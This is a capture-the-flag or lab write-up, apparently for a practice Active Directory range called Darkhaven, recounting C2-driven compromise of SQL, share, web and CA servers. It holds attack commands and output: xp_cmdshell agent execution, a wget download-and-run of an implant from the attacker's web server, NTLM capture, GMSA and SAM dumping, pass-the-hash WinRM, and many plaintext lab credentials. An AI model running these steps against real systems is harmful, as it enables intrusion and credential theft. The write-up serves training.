So since i have already solved this network i will skip the scope and objectives and jump straight in

# Setting listeners
So to start ill set 5 listeners for the 5 machines in subnet 2

For this ill be using adaptix C2 framework

![](Pasted%20image%2020260419153718.png)

All listeners are now set

# Retrieving credentials for `sql_svc`
Ill log into the web portal as the guest user and then query the sql_svc account to get the credentials

![548](Pasted%20image%2020260419153956.png)

```python
sql_svc:SqLS3rvic3!
```

```python
nxc mssql sql.ext.darkhaven.local -u 'sql_svc' -p 'SqLS3rvic3!'                              
MSSQL       10.10.10.133    1433   SQL              [*] Windows 11 / Server 2025 Build 26100 (name:SQL) (domain:ext.darkhaven.local) (EncryptionReq:False)
MSSQL       10.10.10.133    1433   SQL              [+] ext.darkhaven.local\sql_svc:SqLS3rvic3!
```
These credentials get me access to mssql on the sql server

```python
impacket-mssqlclient ext.darkhaven.local/sql_svc:'SqLS3rvic3!'@sql.ext.darkhaven.local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL): Line 1: Changed database context to 'master'.
[*] INFO(SQL): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (sql_svc  dbo@master)> xp_cmdshell whoami
output                
-------------------   
nt authority\system   
NULL                  
SQL (sql_svc  dbo@master)>
```
xp_cmdshell is enabled

So on my listener for the sql server ill generate an agent and transfer it to the target

# NT authority system on the sql server

![466](Pasted%20image%2020260419154400.png)

Ive generated an agent for the sql listener and i can use xp_cmdshell to upload the agent then execute it

```python
SQL (sql_svc  dbo@master)> upload sql-agent.x64.exe C:\Users\Public\sql-agent.x64.exe
[+] Data length (b64-encoded): 117.34 KB with MD5: 48dcfdd66584938be5074d4bcc9553e8
[+] Uploading...
[+] Uploaded
[+] certutil -decode "C:\Users\Public\sql-agent.x64.exe.b64" "C:\Users\Public\sql-agent.x64.exe"
[+] del "C:\Users\Public\sql-agent.x64.exe.b64"
[+] certutil -hashfile "C:\Users\Public\sql-agent.x64.exe" MD5
[+] MD5 hashes match
SQL (sql_svc  dbo@master)> 
```
This uploaded the agent to the target

```python
SQL (sql_svc  dbo@master)> xp_cmdshell C:\Users\Public\sql-agent.x64.exe
```
This executed the agent so now if i look back at adaptix client ive got a connection

![](Pasted%20image%2020260419154739.png)

![](Pasted%20image%2020260419154806.png)

The SQL server is now compromised

# Administrator on the share server
![](Pasted%20image%2020260419154955.png)

Found a keepass database and a read me

```python
[19/04 15:50:38] operator [c5311829] beacon > cat README.txt
[19/04 15:50:38] [*] Task: read file
[19/04 15:50:41] [*] Agent called server, sent [27 bytes]
[19/04 15:50:41] [+] 'README.txt' file content:
﻿Darkhaven Technologies - IT Department Password Store
======================================================
File   : it_passwords.kdbx
Format : KeePass 2.x

Contents:
  - Network Infrastructure
      > Core Switch (sw-core-01)
      > Firewall Admin (fw-ext-01)
      > Out-of-Band Management (OOBM)
  - Servers
      > Domain Controller (dc.ext.darkhaven.local)
      > SQL Server (sql.ext.darkhaven.local)
      > Backup Server (bkp-01.ext.darkhaven.local)
  - Service Accounts
      > sql_svc           (SQL Server service account)
      > svc_backup        (Veeam Backup)
      > svc_monitoring    (SCOM data collector)
      > svc_webpool       (IIS application pool)
      > svc_sccm          (SCCM network access)
  - Cloud / SaaS
      > Azure Portal
      > Microsoft 365 Admin Center
      > Cloudflare DNS

IMPORTANT: Do not copy outside the management VLAN.
Access requests: it-security@darkhaven.local

Master Password: D@rkhav3n_IT_2024!
```
Its given me the master password for the keepass file so it saves me cracking it

Ill download the keepass database to my machine

```python
[19/04 15:52:11] operator [1b1823fc] beacon > download it_passwords.kdbx
[19/04 15:52:11] [*] Task: download file
[19/04 15:52:11] [*] Agent called server, sent [34 bytes]
[19/04 15:52:12] [+] The download of the 'C:\stored_passwords\it_passwords.kdbx' file (2782 bytes) has started: [fid ac755ec0]
[19/04 15:52:12] [+] File download complete: [fid ac755ec0]
```
This downloaded it now i can sync it to the client in adaptix to access it

![](Pasted%20image%2020260419155901.png)

```python
showard:5rtfgvb^RTFGVB
```

Ill connect via SMB on share.ext using these credentials and access the DarkHavenData share

Found an interesing file at \IT\Network\Runbooks\

```python
-- NETWORK PROVISIONING SERVICE ACCOUNT --
  Host      : share.ext.darkhaven.local (10.10.10.135)
  Username  : svc_netops
  Password  : N3t0ps$Svc_2024!
  Role      : Local Administrator on share server
  Purpose   : Automated network configuration backup scripts
              Runs nightly at 02:00 to pull switch/FW configs via TFTP
```
The file had some credentials inside

```python
svc_netops:N3t0ps$Svc_2024!
```

![668](Pasted%20image%2020260419161023.png)

I am able to get access via RDP on the share server and since the account is a localadmin i can open an administrator session

Now i have this i can set a beacon up again on this since i am now an administrator on the share server

![477](Pasted%20image%2020260419161241.png)

Ive generated the agent now i can transfer it to the target ill do this with a python webserver

```python
python3 -m http.server 1337  
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

```python
PS C:\Users\svc_netops\Documents> wget http://192.168.211.2:1337/share-agent.x64.exe -o share-agent.x64.exe
```
This downloaded the file

Now i can execute it!

```python
.\share-agent.x64.exe
```
This executed it!

![](Pasted%20image%2020260419161706.png)

I now have a second session on the domain this time on the Share server

# Administrator on the web server

Remembering the backup procedure i found earllier in the SMB share i already know there is a process where users connect to a SMB share i might be able to intercept NTLM hashes

I can do this with inveigh

## Capturing authentication
```python
svc_webpool::EC2AMAZ-IKFPL26:F183554159AB8EDD:DBBE87BCAF1F8E2C5FBC704B4BC35245:0101000000000000F0FA429879C7DC01EFED8D004E206D2500000000020012004400410052004B0048004100560045004E0001000A0053004800410052004500040026006500780074002E006400610072006B0068006100760065006E002E006C006F00630061006C0003003200730068006100720065002E006500780074002E006400610072006B0068006100760065006E002E006C006F00630061006C00050026006500780074002E006400610072006B0068006100760065006E002E006C006F00630061006C0007000800F0FA429879C7DC0106000400020000000800300030000000000000000000000000300000078B9E06F4ADD88F1FC47C5DAF96AFE83E05BFC550C86CFE5173879BD7B377ED0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310030002E003100330035000000000000000000
```
After uploading and runnign inveigh on the target via my C2 session i retrieved a hash for the svc_webpool

## Cracking the hash
```python
svc_webpool:D@rkH@v3n128!
```
So cracking the hash failed with rockyou but i saw a wordlist of previous password on the domain in the SMB share which is able to crack it!

## Checking authentication
```python
nxc smb web.ext.darkhaven.local -u 'svc_webpool' -p 'D@rkH@v3n128!' --local-auth
SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-IKFPL26) (domain:EC2AMAZ-IKFPL26) (signing:False) (SMBv1:None)
SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [+] EC2AMAZ-IKFPL26\svc_webpool:D@rkH@v3n128! (Pwn3d!)
```
The output is giving me a `(Pwn3d!)` indicated which tells me this user is an admin!

```python
nxc winrm web.ext.darkhaven.local -u 'svc_webpool' -p 'D@rkH@v3n128!' --local-auth
WINRM       10.10.10.132    5985   EC2AMAZ-IKFPL26  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-IKFPL26) (domain:ext.darkhaven.local) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.10.132    5985   EC2AMAZ-IKFPL26  [+] EC2AMAZ-IKFPL26\svc_webpool:D@rkH@v3n128! (Pwn3d!)
```
They also have acces via winrm

This means i can now generate a beacon for my web listener and upload it via winrm to get a C2 session

![496](Pasted%20image%2020260419162933.png)

Ive generated the agent now ill upload it and execute it!

```python
evil-winrm -i web.ext.darkhaven.local -u svc_webpool -p 'D@rkH@v3n128!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_webpool\Documents> upload web-agent.x64.exe
                                        
Info: Uploading /home/kali/hsm/darkhaven/web-agent.x64.exe to C:\Users\svc_webpool\Documents\web-agent.x64.exe
                                        
Data: 120148 bytes of 120148 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc_webpool\Documents> dir


    Directory: C:\Users\svc_webpool\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/19/2026   3:30 PM          90112 web-agent.x64.exe


*Evil-WinRM* PS C:\Users\svc_webpool\Documents> .\web-agent.x64.exe
*Evil-WinRM* PS C:\Users\svc_webpool\Documents> 
```
I should now have a session in my C2 client

![](Pasted%20image%2020260419163159.png)

New administrator session on the web server!

![](Pasted%20image%2020260419163232.png)

# Administrator on the CA server
```python
[19/04 16:34:23] operator [3cad25b1] beacon > cat maint_config.php@2025-01-09_083047
[19/04 16:34:23] [*] Task: read file
[19/04 16:34:24] [*] Agent called server, sent [51 bytes]
[19/04 16:34:24] [+] 'maint_config.php@2025-01-09_083047' file content:
<?php
/**
 * Darkhaven Technologies - Certificate Services Maintenance Script
 * Author  : K. Warren (kwarren@ext.darkhaven.local)
 * Purpose : Internal CA health check, certificate renewal automation,
 *           and web server certificate deployment for IIS/NGINX hosts.
 *
 * Usage   : php cert_maintenance.php [--check | --renew | --deploy]
 *
 * NOTE: This script is run manually from the web server during
 *       scheduled maintenance windows. Do not expose to the web root.
 *       Kept locally for convenience during cert rotation cycles.
 *
 * Last modified: 2025-01-09  kwarren
 */

// -----------------------------------------------------------------------
//  CONFIGURATION
// -----------------------------------------------------------------------

define('CA_HOST',       'ca.ext.darkhaven.local');
define('CA_IP',         '10.10.10.134');
define('CA_PORT',       443);
define('CA_ENROLL_URL', 'http://ca.ext.darkhaven.local/certsrv/');
define('DOMAIN',        'ext.darkhaven.local');
define('DOMAIN_SHORT',  'DARKHAVEN');

// Service account used to authenticate against the CA web enrollment interface
// TODO: move this to environment variable before next audit - kwarren 2025-01-09
define('CA_AUTH_USER',  'DARKHAVEN\\kwarren');
define('CA_AUTH_PASS',  '!@#darkhav3n123#@!');

// Certificate output paths
define('CERT_STAGING',  'C:\\inetpub\\darkhaven\\App_Data\\certs\\staging\\');
define('CERT_DEPLOY',   'C:\\inetpub\\darkhaven\\App_Data\\certs\\live\\');
define('CERT_BACKUP',   'C:\\inetpub\\darkhaven\\App_Data\\certs\\backup\\');
define('LOG_FILE',      'C:\\inetpub\\darkhaven\\App_Data\\cert_maintenance.log');

// Certificate templates available on ca.ext.darkhaven.local
$cert_templates = [
    'WebServer'         => 'Web Server certificate - IIS/NGINX hosts',
    'DomainController'  => 'DC authentication certificate',
    'User'              => 'Standard user certificate',
    'SubCA'             => 'Subordinate CA - requires approval',
    'DarkhavenWebSSL'   =>

+--- Task [3cad25b1] closed ----------------------------------------------------------+
```
Ive found credentials for a user `kwarren` for the CA server

```python
kwarren:!@#darkhav3n123#@!
```

```python
nxc smb ca.ext.darkhaven.local -u 'kwarren' -p '!@#darkhav3n123#@!'                            
SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\kwarren:!@#darkhav3n123#@!
```
The user is compromised!

I will now collect bloodhound data using sharphound and a c2 session i just got on the web server

After collecting bloodhound data i see i have ReadGMSAPassword on the user `ca_svc_account$`

```python
nxc ldap dc.ext.darkhaven.local -u 'kwarren' -p '!@#darkhav3n123#@!' --gmsa               
LDAP        10.10.10.136    389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:ext.darkhaven.local) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.10.10.136    389    DC               [+] ext.darkhaven.local\kwarren:!@#darkhav3n123#@! 
LDAP        10.10.10.136    389    DC               [*] Getting GMSA Passwords
LDAP        10.10.10.136    389    DC               Account: ca_svc_account$      NTLM: 3ab7add8db852831e7299c61ba35e2d2     PrincipalsAllowedToReadPassword: GRP-gMSA-ca_svc_account-Readers
```
I now have the NTLM hash of the `ca_svc_account$`

```python
nxc smb ca.ext.darkhaven.local -u 'ca_svc_account$' -H '3ab7add8db852831e7299c61ba35e2d2'      
SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2 (Pwn3d!)
```
This user is also an administrator on the CA server

```python
nxc winrm ca.ext.darkhaven.local -u 'ca_svc_account$' -H '3ab7add8db852831e7299c61ba35e2d2'
WINRM       10.10.10.134    5985   CA               [*] Windows 11 / Server 2025 Build 26100 (name:CA) (domain:ext.darkhaven.local) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.10.134    5985   CA               [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2 (Pwn3d!)
```
This user also has access via winrm so i can now generate a beacon and upload it via the winrm session

![546](Pasted%20image%2020260419164720.png)

I have now generated the beacon now ill get access via winrm upload the beacon and execute it

So it appears that account cannot get access via winrm so what ill do instead it just dump the SAM 

```python
nxc smb ca.ext.darkhaven.local -u 'ca_svc_account$' -H '3ab7add8db852831e7299c61ba35e2d2' --sam
SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2 (Pwn3d!)
SMB         10.10.10.134    445    CA               [*] Dumping SAM hashes
SMB         10.10.10.134    445    CA               Administrator:500:aad3b435b51404eeaad3b435b51404ee:7af69f428fd21312a225c74e5f574ed6:::
SMB         10.10.10.134    445    CA               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.134    445    CA               DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.134    445    CA               WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7490f2a63d713a813eda5bf8fd1a8227:::
SMB         10.10.10.134    445    CA               ca_svc_account$:1000:aad3b435b51404eeaad3b435b51404ee:d825d33332279362b7c3e6ba121aa570:::
SMB         10.10.10.134    445    CA               [+] Added 5 SAM hashes to the database
```
Now i can use the administrator hash to get access via winrm 

```python
evil-winrm -i ca.ext.darkhaven.local -u 'Administrator' -H '7af69f428fd21312a225c74e5f574ed6'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload CA-agent.x64.exe
                                        
Info: Uploading /home/kali/hsm/darkhaven/CA-agent.x64.exe to C:\Users\Administrator\Documents\CA-agent.x64.exe
                                        
Data: 120148 bytes of 120148 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir


    Directory: C:\Users\Administrator\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/19/2026   3:51 PM          90112 ca-agent.x64.exe


*Evil-WinRM* PS C:\Users\Administrator\Documents> ./ca-agent.x64.exe
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
Now i should have a session on my c2 client

![](Pasted%20image%2020260419165237.png)

New administrator session on the CA server

# Administrator on the external Domain Controller
```python
nxc smb ca.ext.darkhaven.local -u 'ca_svc_account$' -H '3ab7add8db852831e7299c61ba35e2d2' -M powershell_history
SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2 (Pwn3d!)
POWERSHE... 10.10.10.134    445    CA               C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
POWERSHE... 10.10.10.134    445    CA                   $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
POWERSHE... 10.10.10.134    445    CA                   $localLog = "C:\Temp\network_health_$timestamp.txt"
POWERSHE... 10.10.10.134    445    CA                   $ping = Test-Connection -ComputerName $device.IP -Count 2 -Quiet`
POWERSHE... 10.10.10.134    445    CA                   $tcp22 = Test-NetConnection -ComputerName $device.IP -Port 22 -InformationLevel Quiet`
POWERSHE... 10.10.10.134    445    CA                   Write-Host "Health check complete. Preparing to upload log..."
POWERSHE... 10.10.10.134    445    CA                   net use \\dc01\share /user:ldap_svc 6trfgvb**hs#@jskKFHJAh34
POWERSHE... 10.10.10.134    445    CA                   net use \\dc01\share /delete
POWERSHE... 10.10.10.134    445    CA                   echo "" > C:\Users\Administrator.DARKHAVEN\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
POWERSHE... 10.10.10.134    445    CA                   net user "ca_svc_account$" "RTGHs82358sUFU*$%*&#jskj"
POWERSHE... 10.10.10.134    445    CA               C:\Users\Administrator.DARKHAVEN\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
POWERSHE... 10.10.10.134    445    CA                   
POWERSHE... 10.10.10.134    445    CA                   
POWERSHE... 10.10.10.134    445    CA                   
POWERSHE... 10.10.10.134    445    CA               C:\Users\ca_svc_account$\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
POWERSHE... 10.10.10.134    445    CA                   net user administrator "ebz0yxy3txh9BDE*yeh"
```
Ill use a nxc module to dump the powershell history

```python
ldap_svc:6trfgvb**hs#@jskKFHJAh34
ca_svc_account$:RTGHs82358sUFU*$%*&#jskj
Administrator:ebz0yxy3txh9BDE*yeh
```
The ca service account is already compromised

And the administrator on this machine is already compromised so the only interesting thing here is the ldap svc

```python
nxc smb dc.ext.darkhaven.local -u 'ldap_svc' -p '6trfgvb**hs#@jskKFHJAh34' -k                        
SMB         dc.ext.darkhaven.local 445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
SMB         dc.ext.darkhaven.local 445    DC               [+] ext.darkhaven.local\ldap_svc:6trfgvb**hs#@jskKFHJAh34 (Pwn3d!)
```
Using kerberos authentication i see that the ldap_svc account is an administrator on the domain controller

So ive got two options here i can either setup a realm and attempt to autheticate to winrm on the dc using `ldap_svc` or i can use `ldap_svc` access to perform a secretsdump and get the administrator hash then winrm that way!

